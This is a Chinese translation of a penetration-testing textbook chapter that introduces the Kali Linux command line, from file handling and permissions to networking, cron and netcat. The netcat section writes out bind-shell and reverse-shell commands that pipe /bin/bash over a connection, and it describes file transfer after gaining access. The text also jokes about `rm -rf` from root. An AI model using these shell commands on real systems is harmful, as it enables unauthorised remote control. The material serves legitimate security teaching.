## 第二章. 使用 Kali Linux

在本书中，你将使用 Kali Linux 作为攻击平台。Kali 是流行的 BackTrack Linux 的继任者，它是基于 Debian 的发行版，预装并预配置了大量渗透测试工具。任何曾经尝试在大型任务前一天从零开始设置渗透测试盒子的人都知道，要让一切正常工作真的是一件很麻烦的事。Kali 预先配置好的一切可以节省很多时间和麻烦。Kali Linux 的工作方式与标准的 Debian GNU/Linux 发行版一样，只是多了很多额外的工具。

与其在 Kali 中点点鼠标，不如使用 Linux 命令行，因为真正的力量就在其中。在本章中，我们将介绍如何通过命令行执行一些常见的 Linux 任务。如果你已经是 Linux 专家，可以跳过本章，直接阅读第三章；如果不是，花些时间深入了解一下吧。

## Linux 命令行

Linux 命令行如下所示：

```
root@kali:~#
```

类似于 DOS 提示符或 Mac OS 终端，Linux 命令行通过一个叫做 Bash 的命令处理器让你输入文本指令，从而控制系统。当你打开命令行时，你会看到提示符`root@kali#`。*Root*是 Linux 系统上的超级用户，拥有对 Kali 的完全控制权限。

在 Linux 中执行操作时，你需要输入命令以及相关的选项。例如，要查看 root 的主目录内容，可以输入如下面所示的命令**`ls`**。

```
root@kali:~# ls
Desktop
```

如你所见，根目录下没有太多东西，只有一个叫做*Desktop*的文件夹。

## Linux 文件系统

在 Linux 世界里，一切皆文件：键盘、打印机、网络设备——所有的东西都可以视为文件。所有文件都可以查看、编辑、删除、创建和移动。Linux 文件系统由一系列从文件系统根目录（`/`）分支出来的目录组成。

要查看当前目录，可以在终端输入**`pwd`**：

```
root@kali:~# pwd
/root
```

### 切换目录

要切换到另一个目录，可以使用绝对路径或相对路径，输入`cd` *`directory`*，具体路径根据你当前的位置来决定。*绝对路径*是指相对于根目录（`/`）的文件路径。例如，要从任何地方切换到桌面，你可以输入绝对路径`cd /root/Desktop`来进入根用户的桌面。如果你当前所在的目录是*/root*（根用户的主目录），你可以使用桌面的*相对路径*（即相对于当前位置）输入`cd Desktop`，这也会把你带到桌面。

命令`cd ..`会让你返回到文件系统的上一级，如下所示。

```
root@kali:~/Desktop# cd ..
root@kali:~/# cd ../etc
root@kali:/etc#
```

从 root 的*Desktop*目录输入`cd ..`可以返回到 root 的主目录。从那里输入`cd ../etc`会让你回到文件系统的根目录，然后进入*/etc*目录。

## 学习命令：手册页

要了解更多关于命令及其选项和参数的信息，你可以通过输入`man` *`命令`*来查看其文档（称为*手册页*或*man 页*）。例如，要了解更多关于`ls`命令的信息，可以输入**`man ls`**，如示例 2-1 所示。

示例 2-1. Linux man 页

```
root@kali:~# man ls

LS(1)                            User Commands                           LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]... ❶

DESCRIPTION ❷
       List  information  about  the FILEs (the current directory by default).
       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci-
       fied.

       Mandatory  arguments  to  long  options are mandatory for short options
       too.

       -a, --all ❸
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..
--*snip*--
       -l     use a long listing format
--*snip*--
```

手册页提供了关于`ls`命令的有用信息（尽管看起来有些不太友好），包括其用法❶、描述❷和可用选项❸。

正如你在描述部分❷中看到的，`ls`命令默认列出当前工作目录中的所有文件，但你也可以使用`ls`来获取有关特定文件的信息。例如，根据手册页，你可以使用`-a`选项与`ls`一起显示所有文件，包括*隐藏目录*——这些目录在默认的`ls`列表中是不可见的——如示例 2-2 所示。

示例 2-2. 使用选项与`ls`

```
root@kali:~# ls -a
.                         .mozilla
..                        .msf4
.android                  .mysql_history
.bash_history             .nano_history
--*snip*--
```

如你所见，在根目录中有几个隐藏目录，它们的名称前都有一个点（`.`）字符。（在第八章中，我们将看到这些有时隐藏的目录如何导致系统遭到攻破。）你还可以看到条目`.`和`..`，分别表示当前目录和上级目录。

## 用户权限

Linux 用户账户为特定的个人或服务提供资源。用户可以通过密码登录，并被提供访问 Linux 系统上的某些资源的权限，例如写文件和浏览互联网的能力。该用户可能无法看到属于其他用户的文件，并且可以合理地保证其他用户也看不到他或她的文件。除了传统的用户账户（用户通过密码登录并访问系统）外，Linux 系统还允许软件拥有一个用户账户。该软件可以使用系统资源来完成其工作，但无法读取其他用户的私人文件。在 Linux 系统中，公认的最佳做法是以没有特权的用户账户运行日常命令，而不是以特权的 root 用户身份运行所有操作，以避免无意中损害系统或授予运行的命令和应用程序过多的权限。

### 添加用户

默认情况下，Kali 只提供特权的 root 账户。尽管许多安全工具需要 root 权限才能运行，但你可能希望为日常使用添加另一个没有特权的账户，以减少系统受损的潜在风险。记住，root 账户可以在 Linux 上执行任何操作，包括破坏你所有的文件。

要将一个新用户*georgia*添加到 Kali 系统中，使用`adduser`命令，如示例 2-3 所示。

示例 2-3. 添加新用户

```
root@kali:~# adduser georgia
Adding user `georgia' ...
Adding new group `georgia' (1000) ...
Adding new user `georgia' (1000) with group `georgia' ... ❶
Creating home directory `/home/georgia' ... ❷
Copying files from `/etc/skel' ...
Enter new UNIX password: ❸
Retype new UNIX password:
passwd: password updated successfully
Changing the user information for georgia
Enter the new value, or press ENTER for the default
      Full Name []: **Georgia Weidman** ❹
      Room Number []:
      Work Phone []:
      Home Phone []:
      Other []:
Is the information correct? [Y/n] **Y**
```

如你所见，除了将用户添加到系统中外，还创建了一个名为*georgia*的组，新的用户被添加到此组中❶，为用户创建了一个主目录❷，系统会提示输入用户信息，例如密码❸和用户的全名❹。

### 将用户添加到 sudoers 文件

当你作为普通用户需要执行需要 root 权限的操作时，可以使用`sudo`命令，并将你想以 root 身份执行的命令与之一起输入，然后输入你的密码。为了让新创建的用户*georgia*能够运行特权命令，你需要将她添加到*sudoers*文件中，该文件指定哪些用户可以使用`sudo`命令。为此，可以输入**`adduser`** `username` **`sudo`**，如图所示。

```
root@kali:~# adduser georgia sudo
Adding user 'georgia' to group `sudo' ...
Adding user georgia to group sudo
Done.
```

### 切换用户和使用 sudo

要在终端会话中切换用户，比如从 root 用户切换到*georgia*，可以使用`su`命令，如示例 2-4 所示。

示例 2-4. 切换到不同的用户

```
root@kali:~# su georgia
georgia@kali:/root$ **adduser john**
bash: adduser: command not found ❶
georgia@kali:/root$ **sudo adduser john**
[sudo] password for georgia:
Adding user `john' ... ❷
Adding new group `john' (1002) ...
Adding new user `john' (1002) with group `john' ...
*--snip--*
georgia@kali:/root$ su
Password:
root@kali:~#
```

你可以使用`su`命令切换用户。如果你尝试运行需要比当前用户（*georgia*）更高权限的命令（例如`adduser`命令），该命令会失败（`command not found`）❶，因为你只能以 root 身份运行`adduser`命令。

幸运的是，正如之前讨论的那样，你可以使用`sudo`命令以 root 身份执行命令。由于*georgia*用户是`sudo`组的成员，你可以运行特权命令，并且可以看到用户*john*已被添加到系统中❷。

要切换回 root 用户，输入`su`命令，不带用户名。系统会提示你输入 root 的密码（*toor*）。

### 创建新文件或目录

要创建一个名为*myfile*的新空文件，请使用`touch`命令。

```
root@kali:# touch myfile
```

要在当前工作目录中创建一个新目录，输入**`mkdir`** `directory`，如图所示。

```
root@kali:~# mkdir mydirectory
root@kali:~# ls
 Desktop               mydirectory        myfile
root@kali:~# cd mydirectory/
```

使用**`ls`**确认新目录已创建，然后使用**`cd`**进入*mydirectory*。

### 复制、移动和删除文件

要复制文件，请使用`cp`命令，如图所示。

```
root@kali:/mydirectory# cp /root/myfile myfile2
```

语法是`cp` *`source destination`*。使用`cp`时，原始文件保持不变，并且会在指定的目标位置创建一个副本。

同样，你可以使用`mv`命令将文件从一个位置移动到另一个位置。语法与`cp`相同，但这时文件会从源位置删除。

你可以通过输入`rm` *`file`*来从文件系统中删除一个文件。要递归删除文件，请使用`-r`选项。

### 警告

删除文件时要小心，特别是递归删除！一些黑客开玩笑说，教 Linux 初学者的第一条命令是`rm -rf`，从根目录开始，这会强制删除整个文件系统。这教给新用户执行 root 权限操作的强大威力。别在家尝试这个！

### 向文件添加文本

`echo`命令会将你输入的内容回显到终端，如图所示。

```
root@kali:/mydirectory# echo hello georgia
hello georgia
```

要将文本保存到文件中，你可以将输入重定向到文件，而不是终端，使用`>`符号。

```
root@kali:/mydirectory# echo hello georgia > myfile
```

要查看新文件的内容，你可以使用`cat`命令。

```
root@kali:/mydirectory# cat myfile
hello georgia
```

现在，将另一行文本回显到*myfile*中，如下所示。

```
root@kali:# echo hello georgia again > myfile
root@kali:/mydirectory# cat myfile
hello georgia again
```

`>`符号会覆盖文件的先前内容。如果你将另一行文本回显到*myfile*中，该新行将覆盖先前命令的输出。正如你所见，*myfile*的内容现在是*hello georgia again*。

### 向文件追加文本

要向文件追加文本，使用`>>`，如下所示。

```
root@kali:/mydirectory# echo hello georgia a third time >> myfile
root@kali:/mydirectory# cat myfile
hello georgia again
hello georgia a third time
```

如你所见，追加操作保留了文件的先前内容。

## 文件权限

如果你查看`ls -l`命令在*myfile*上的长格式输出，你可以看到*myfile*当前的权限。

```
root@kali:~/mydirectory# ls -l myfile
-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile
```

从左到右，你可以看到文件类型和权限（`-rw-r—r--`）、文件链接数（1）、拥有该文件的用户和组（root）、文件大小（47 字节）、最后编辑文件的时间（4 月 23 日，21:15），最后是文件名（*myfile*）。

Linux 文件有读（`r`）、写（`w`）和执行（`x`）权限，并且有三组用户权限：所有者、用户组和所有用户的权限。前三个字母表示所有者的权限，接下来的三个表示用户组的权限，最后三个表示所有用户的权限。由于你是以 root 用户账户创建的*myfile*，所以该文件属于用户*root*和用户组*root*，正如你在`root root`的输出中所看到的那样。root 用户具有文件的读写权限（`rw`）。如果用户组中有其他用户，他们可以读取该文件（`r`），但不能写入或执行该文件。最后一个`r`表示文件系统上的所有用户都可以读取该文件。

要更改文件的权限，使用`chmod`命令。你可以使用`chmod`来为所有者、用户组和世界指定权限。指定权限时，使用从 0 到 7 的数字，如表 2-1 所示。

表 2-1。Linux 文件权限

| 整数值 | 权限 | 二进制表示 |
| --- | --- | --- |
| 7 | 完全权限 | 111 |
| 6 | 读和写 | 110 |
| 5 | 读和执行 | 101 |
| 4 | 仅读取 | 100 |
| 3 | 写入和执行 | 011 |
| 2 | 仅写入 | 010 |
| 1 | 仅执行 | 001 |
| 0 | 无权限 | 000 |

当输入新的文件权限时，你使用一个数字表示所有者的权限，一个数字表示用户组的权限，一个数字表示世界的权限。例如，要给所有者完全的权限，但不给用户组和世界任何读、写或执行的权限，可以使用**`chmod 700`**，如下所示：

```
root@kali:~/mydirectory# chmod 700 myfile
root@kali:~/mydirectory# ls -l myfile
-rwx------❶ 1 root root 47 Apr 23 21:15 myfile
```

现在，当你在*myfile*上运行`ls -l`命令时，你可以看到 root 用户具有读、写和执行（`rwx`）权限，而其他的权限设置为空白❶。如果你尝试以 root 之外的任何用户身份访问该文件，你将收到权限拒绝错误。

## 编辑文件

也许没有什么辩论能像哪个是最好的文件编辑器那样激发 Linux 用户的热情。在这里，我们将看看两款流行编辑器 vi 和 nano 的基础使用方法，从我最喜欢的 nano 开始。

```
root@kali:~/mydirectory# nano testfile.txt
```

一旦进入 nano，你可以开始向一个名为*testfile.txt*的新文件中添加文本。当你打开 nano 时，你应该看到一个空白文件，屏幕底部会显示 nano 的帮助信息，如下所示。

```
                                  [ New File ]
^G Get Help  ^O WriteOut  ^R Read File ^Y Prev Page ^K Cut Text  ^C Cur Pos
^X Exit      ^J Justify   ^W Where Is  ^V Next Page ^U UnCut Text^T To Spell
```

要向文件中添加文本，只需开始输入即可。

### 搜索文本

要在文件中搜索文本，使用 ctrl-W，然后在搜索提示符下输入要搜索的文本，如下所示。

```
--*snip*--
Search:**georgia**
^G Get Help  ^Y First Line^T Go To Line^W Beg of ParM-J FullJstifM-B Backwards
^C Cancel    ^V Last Line ^R Replace   ^O End of ParM-C Case SensM-R Regexp
```

如果文件中有*georgia*这个单词，nano 应该能找到它。要退出，按 ctrl-X。系统会提示你保存文件或放弃更改，如下所示：

```
--*snip*--
Save modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ? **Y**
 Y Yes
 N No           ^C Cancel
```

输入**`Y`**保存文件。现在我们将使用 vi 编辑器来编辑该文件。

### 使用 vi 编辑文件

将示例 2-5 中的文本添加到*testfile.txt*中。除了文件内容外，你还会在 vi 屏幕底部看到一些信息，包括文件名、行数和当前光标位置（参见示例 2-5）。

示例 2-5. 使用 vi 编辑文件

```
root@kali:~/mydirectory# vi testfile.txt
hi
georgia
we
are
teaching
pentesting
today
~

"testfile.txt" 7L, 46C                                        1,1           All
```

与 nano 不同，打开文件后，你不能直接开始编辑。在 vi 中编辑文件时，输入**`I`**将 vi 切换到插入模式。你应该能在终端底部看到*INSERT*字样。完成编辑后，按 esc 退出插入模式并返回到命令模式。在命令模式下，你可以使用命令编辑文本。例如，将光标定位到`we`这一行，输入**`dd`**即可删除文件中的`we`。

要退出 vi，输入:**`wq`**告诉 vi 将更改写入文件并退出，如示例 2-6 所示。

示例 2-6. 在 vi 中保存更改

```
hi
georgia
are
teaching
pentesting
today

:**wq**
```

### 注意

要了解更多 vi 和 nano 的可用命令，请阅读相应的 man 手册。

你每天使用哪个编辑器由你决定。在本书中我们将使用 nano 编辑文件，但你可以自由选择你喜欢的编辑器。

## 数据操作

现在进行一些数据操作。使用你喜欢的文本编辑器，输入示例 2-7 中的文本到*myfile*中。该文件列出了一些我最喜欢的安全会议以及它们通常发生的月份。

示例 2-7. 数据操作示例列表

```
root@kali:~/mydirectory# cat myfile
1 Derbycon September
2 Shmoocon January
3 Brucon September
4 Blackhat July
5 Bsides *
6 HackerHalted October
7 Hackcon April
```

### 使用 grep

命令`grep`用于查找文件中某个文本字符串的实例。例如，要搜索文件中所有出现的*September*字符串，输入**`grep`** **`September`** **`myfile`**，如下所示。

```
root@kali:~/mydirectory# grep September myfile
1 Derbycon September
3 Brucon September
```

正如你所看到的，`grep`告诉我们 Derbycon 和 Brucon 是在 9 月。

假设你现在只想获取九月的会议名称，而不包括会议的编号或月份。你可以通过管道（`|`）将`grep`的输出传递给另一个命令进行进一步处理。`cut`命令允许你处理每一行输入，选择分隔符，并打印特定的字段。例如，要仅获取在九月举行的会议名称，你可以像之前一样使用`grep`查找*September*这个词。接下来，你将输出通过管道（`|`）传递给`cut`，在`cut`中你可以使用`-d`选项指定空格为分隔符，并通过`-f`选项指定你想要的第二个字段，如下所示。

```
root@kali:~/mydirectory# grep September myfile | cut -d " " -f 2
Derbycon
Brucon
```

如你所见，通过将这两个命令通过管道连接在一起，最终只得到会议名为 Derbycon 和 Brucon 的两个会议。

### 使用 sed

另一个用于数据处理的命令是`sed`。关于如何使用`sed`已经有整本书被写了下来，但我们这里仅介绍一些基本操作，例如查找特定单词并进行替换。

`sed`命令非常适合根据特定模式或表达式自动编辑文件。例如，假设你有一个非常长的文件，并且需要替换某个特定单词的每个实例。你可以使用`sed`命令快速并自动完成这项任务。

在`sed`的语法中，斜杠（`/`）是分隔符字符。例如，要将文件*myfile*中所有出现的*Blackhat*替换为*Defcon*，可以输入**`sed 's/Blackhat/Defcon/' myfile`**，如示例 2-8 中所示。

示例 2-8. 使用`sed`替换单词

```
root@kali:~/mydirectory# sed 's/Blackhat/Defcon/' myfile
1 Derbycon September
2 Shmoocon January
3 Brucon September
4 Defcon July
5 Bsides *
6 HackerHalted October
7 Hackcon April
```

### 使用 awk 进行模式匹配

另一个用于模式匹配的命令行工具是`awk`命令。例如，如果你想查找编号为 6 或更大的会议，你可以使用`awk`搜索第一字段，查找大于 5 的条目，如下所示。

```
root@kali:~/mydirectory# awk '$1 >5' myfile
6 HackerHalted October
7 Hackcon April
```

或者，如果你只想要每行的第一和第三个单词，可以输入**`awk '{print $1,$3;}' myfile`**，如示例 2-9 中所示。

示例 2-9. 使用`awk`选择特定列

```
root@kali:~/mydirectory# awk '{print $1,$3;}' myfile
1 September
2 January
3 September
4 July
5 *
6 October
7 April
```

### 注意

本节我们只展示了使用这些数据处理工具的简单示例。要获取更多信息，请查阅手册页。这些工具可以成为强大的时间节省器。

## 管理已安装的软件包

在基于 Debian 的 Linux 发行版（如 Kali Linux）中，你可以使用高级包装工具（`apt`）来管理软件包。要安装一个软件包，输入**`apt-get install`** `package`。例如，要在 Kali Linux 中安装 Metasploit 的前端工具 Armitage，请输入以下命令：

```
root@kali:~# apt-get install armitage
```

就这么简单：`apt`会为你安装并配置 Armitage。

Kali Linux 中的工具会定期发布更新。要获取已安装包的最新版本，请输入 **`apt-get upgrade`**。Kali 使用的包存储库列在文件 */etc/apt/sources.list* 中。若要添加额外的存储库，你可以编辑此文件并运行 `apt-get update` 命令来刷新数据库，包含新的存储库。

### 注意

本书基于 Kali 1.0.6 的基础安装，除非在 第一章 中另有说明，否则为了跟随本书的内容，请不要更新 Kali。

## 进程和服务

在 Kali Linux 中，你可以使用 `service` 命令启动、停止或重启服务。例如，要启动 Apache 网络服务器，请输入 **`service apache2 start`**，如下所示。

```
root@kali:~/mydirectory# service apache2 start
[....] Starting web server: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
```

同样，要停止 MySQL 数据库服务器，请输入 **`service mysql stop`**。

## 管理网络

在设置 Kali Linux 虚拟机时，参考了 第一章，你使用了 `ifconfig` 命令来查看网络信息，如 示例 2-10 所示。

示例 2-10. 使用 `ifconfig` 查看网络信息

```
root@kali:~# ifconfig
eth0❶     Link encap:Ethernet  HWaddr 00:0c:29:df:7e:4d
          inet addr:192.168.20.9❷  Bcast:192.168.20.255  Mask:255.255.255.0❸
          inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0
          TX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1048617759 (1000.0 MiB)  TX bytes:115091335 (109.7 MiB)
          Interrupt:19 Base address:0x2024
*--snip--*
```

从 `ifconfig` 的输出中，你可以获得关于系统网络状态的很多信息。首先，网络接口名为 `eth0` ❶。我的 Kali 机器用来与网络通信的 IPv4 地址（`inet addr`）是 192.168.20.9 ❷（你的可能不同）。*IP 地址* 是分配给网络中设备的 32 位标签。IP 地址由 4 个八位字节（或 8 位部分）组成。

地址的 *网络掩码*，或 *子网掩码*（`Mask`），在 ❸ 处标识了 IP 地址的哪些部分属于网络，哪些部分属于主机。在此案例中，子网掩码 255.255.255.0 告诉你网络的前三个八位字节是 192.168.20。

*默认网关* 是你的主机用于路由流量到其他网络的位置。任何指向本地网络以外的流量都会被发送到默认网关，由它来确定流量的去向。

```
root@kali:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         192.168.20.1❶   0.0.0.0         UG    0      0        0 eth0
192.168.20.0    *               255.255.255.0   U     0      0        0 eth0
```

`route` 命令的输出告诉我们默认网关是 192.168.20.1 ❶。这很有道理，因为 IP 地址为 192.168.20.1 的系统是我家网络中的无线路由器。请记下你自己的默认网关，以便在下一节中使用。

### 设置静态 IP 地址

默认情况下，你的网络连接使用动态主机配置协议（DHCP）从网络中获取一个 IP 地址。若要设置静态地址，确保你的 IP 地址不变，你需要编辑文件 */etc/network/interfaces*。使用你喜欢的编辑器打开此文件。默认配置文件如 示例 2-11 所示。

示例 2-11. 默认的 /etc/network/interfaces 文件

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo inet loopback
```

要为你的系统设置静态 IP 地址，你需要为 eth0 接口添加一个条目。将示例 2-12 中显示的文本添加到*/etc/network/interfaces*中，并修改 IP 地址以匹配你的环境。

示例 2-12. 添加静态 IP 地址

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

# The loopback network interface
auto lo
iface lo inet loopback
**auto eth0**
**iface eth0 inet static** ❶
**address 192.168.20.9**
**netmask 255.255.255.0** ❷
**gateway 192.168.20.1** ❸
```

你已将 eth0 的 IP 地址设置为静态 IP 地址，如❶所示。使用你在上一节中找到的 IP 地址、子网掩码❷和网关❸来填写文件中的相关信息。

一旦你做出这些更改，使用`service networking restart`重新启动网络服务，以便使用新添加的静态网络信息。

### 查看网络连接

要查看网络连接、监听端口等，可以使用`netstat`命令。例如，你可以通过执行命令`netstat -antp`来查看监听 TCP 端口的程序，如示例 2-13 所示。*端口*仅仅是基于软件的网络套接字，在网络上监听，允许远程系统与系统上的程序进行交互。

示例 2-13. 使用`netstat`查看监听端口

```
root@kali:~/mydirectory# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp6       0      0 :::80                   :::*                    LISTEN      15090/apache2
```

你会看到你在本章开始时启动的 Apache web 服务器在 TCP 端口 80 上监听。（有关其他`netstat`选项，请查看 man 页面。）

## Netcat：TCP/IP 连接的瑞士军刀

正如 man 页面所指出的，Netcat 工具被称为 TCP/IP 连接的瑞士军刀。它是一个多功能的工具，我们将在本书中贯穿使用。

要查看 Netcat 的各种选项，请输入**`nc -h`**，如示例 2-14 所示。

示例 2-14. Netcat 帮助信息

```
root@kali:~# nc -h
[v1.10-40]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
      -c shell commands  as `-e'; use /bin/sh to exec [dangerous!!]
      -e filename       program to exec after connect [dangerous!!]
      -b                allow broadcasts
--*snip*--
```

### 检查端口是否处于监听状态

让我们让 Netcat 连接到一个端口，看看该端口是否正在监听连接。你之前看到的 Apache web 服务器正在 Kali Linux 系统的端口 80 上监听。让 Netcat 通过`-v`选项以详细模式连接端口 80，如下所示。如果你正确启动了 Apache，当尝试连接该服务时，你应该看到以下内容。

```
root@kali:~# nc -v 192.168.20.9 80
(UNKNOWN) [192.168.20.10] 80 (http) open
```

正如你所看到的，Netcat 报告显示端口 80 确实在网络上处于监听状态（`open`）。（我们将在第五章的端口扫描讨论中进一步了解开放端口及其为何重要。）

你也可以使用 Netcat 监听某个端口上的传入连接，方法如下所示。

```
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
```

你使用`l`选项进行监听，`v`选项启用详细模式，`p`选项指定要监听的端口。

接下来，打开第二个终端窗口，使用 Netcat 连接到 Netcat 监听器。

```
root@kali:~# nc 192.168.20.9 1234
**hi georgia**
```

一旦你连接，输入文本**`hi georgia`**，当你返回到监听器的终端窗口时，你会看到一个连接已建立，并且你的文本已被打印出来。

```
listening on [any] 1234 ...
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917
hi georgia
```

通过按 CTRL-C 关闭两个 Netcat 进程。

### 打开命令行 Shell 监听器

现在来点更有趣的。当你设置 Netcat 监听器时，使用 `-e` 标志告诉 Netcat 在接收到连接时执行 */bin/bash*（或者启动一个 Bash 命令提示符）。这允许任何连接到监听器的人在你的系统上执行命令，如下所示。

```
root@kali:~# nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
```

再次使用第二个终端窗口连接到 Netcat 监听器。

```
root@kali:~# nc 192.168.20.9 1234
whoami
root
```

现在，你可以发出 Linux 命令让 Netcat 监听器执行。`whoami` Linux 命令会告诉你当前登录的用户。在这种情况下，因为 Netcat 进程是由 *root* 用户启动的，所以你的命令将以 *root* 用户的身份执行。

### 注意

这是一个简单的例子，因为你的 Netcat 监听器和连接都在同一系统上。你也可以使用你另外的虚拟机，甚至是你的宿主系统来进行这个练习。

再次关闭两个 Netcat 进程。

### 将命令行 Shell 推送回监听器

除了在端口上监听命令行 Shell，你还可以将命令行 Shell 推送回 Netcat 监听器。这次设置 Netcat 监听器时不使用 `-e` 标志，如下所示。

```
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
```

现在打开第二个终端，并像这里所示的那样，重新连接到你刚刚创建的 Netcat 监听器。

```
root@kali:~# nc 192.168.20.9 1234 -e /bin/bash
```

按照平常的方式使用 Netcat 进行连接，但这次使用 `-e` 标志在连接上执行 */bin/bash*。回到第一个终端，你会看到如下面所示的连接，如果你输入终端命令，你会看到它们被执行。（我们将在第四章中学习更多关于在本地端口上监听 */bin/bash* 和通过连接主动推送 */bin/bash*，分别被称为 *bind shells* 和 *reverse shells*。）

```
listening on [any] 1234 ...
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921
whoami
root
```

现在，Netcat 还有一个功能。这次，不是将进入监听器的数据输出到屏幕，而是使用 `>` 将其发送到文件中，如下所示。

```
root@kali:~# nc -lvp 1234 > netcatfile
listening on [any] 1234 ...
```

在第二个终端中，你设置了 Netcat 进行连接，但这次你使用了 `<` 符号来告诉它通过 Netcat 连接发送一个文件（*myfile*）的内容。给 Netcat 几秒钟的时间来完成，然后检查由你第一个 Netcat 实例创建的文件 *netcatfile* 的内容。其内容应该与 *myfile* 完全相同。

```
root@kali:~# nc 192.168.20.9 1234 < mydirectory/myfile
```

你已经使用 Netcat 转移了文件。在这个例子中，我们只是将文件从一个目录转移到另一个目录，但你可以想象，这种技术可以用来在系统之间转移文件——这是渗透测试后期阶段，获得系统访问权限后的常用技术。

## 使用 cron 任务自动化任务

`cron` 命令允许我们安排任务在指定时间自动运行。在 Kali 系统的 */etc* 目录中，你可以看到与 `cron` 相关的多个文件和目录，如示例 2-15 所示。

示例 2-15. crontab 文件

```
root@kali:/etc# ls | grep cron
cron.d
cron.daily
cron.hourly
cron.monthly
crontab
cron.weekly
```

*cron.daily*、*cron.hourly*、*cron.monthly* 和 *cron.weekly* 目录指定了将自动运行的脚本，分别是每天、每小时、每月或每周，根据你将脚本放入哪个目录来决定。

如果你需要更多的灵活性，可以编辑 `cron` 的配置文件，*/etc/crontab*。默认文本如 示例 2-16 所示。

示例 2-16. `crontab` 配置文件

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user     command
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly ❶
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) ❷
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

`crontab` 中的字段，从左到右依次为：分钟、小时、日期、月份、星期、执行命令的用户，最后是要执行的命令。要使命令每天、每小时等都运行，你可以使用星号（`*`）来代替指定某一列的具体值。

例如，查看第一个 `crontab` 行 ❶，它会运行每小时执行的 `cron` 任务，这些任务在 */etc/cron.hourly* 中指定。这个 `crontab` 在每小时的第 17 分钟，每天、每月、每周都运行。第 ❷ 行表示每日的 `crontab`（*/etc/cron.daily*）将在每天、每月、每周的第 6 小时的第 25 分钟执行。（为了更大的灵活性，你可以在这里添加一行，而不是将其添加到每小时、每天、每周或每月的列表中。）

## 小结

本章我们探讨了一些常见的 Linux 操作任务。浏览 Linux 文件系统、处理数据和运行服务，这些技能将对你在本书的学习过程中大有帮助。此外，在攻击 Linux 系统时，知道在 Linux 环境下运行哪些命令，将帮助你充分利用成功的利用技巧。你可能希望通过设置 `cron` 任务定期自动运行某些命令，或者使用 Netcat 从你的攻击机器传输文件。你将在本书中使用 Kali Linux 进行攻击，并且你的目标系统是 Ubuntu Linux，因此掌握这些基础知识将使学习渗透测试变得更加自然。
